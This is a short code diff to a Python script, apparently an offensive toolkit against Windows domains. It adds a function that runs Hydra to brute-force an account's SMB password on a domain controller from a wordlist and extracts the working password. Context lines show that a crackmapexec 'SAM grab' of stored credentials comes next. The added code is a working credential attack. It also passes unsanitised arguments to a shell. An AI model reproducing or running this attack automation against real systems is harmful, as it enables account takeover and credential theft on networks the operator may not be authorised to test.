@@ -4,6 +4,23 @@ import shutil
 import subprocess
 import sys
 
+
+
+
+# Step 0.5: Use Hydra to get a working password given a user account and domain IP address
+# ip: a string IP address for the domain controller
+# username: string (for the above IP)
+# dictionary: a txt file of passwords to try with the username above
+# Returns: a string containing a working password for the above username
+
+def hydraPass(ip, username, dictionary):
+    command = 'hydra -l '+ username + ' -P ' + dictionary + ' smb://' + ip + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '$6 ~ /^password:$/{print $7}'"""
+    return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')
+    
+
+
+
+
 # Step 1: use crackmapexec to do a SAM grab
 # ip: a string IP address for the domain controller
 # username: string (for the above IP)
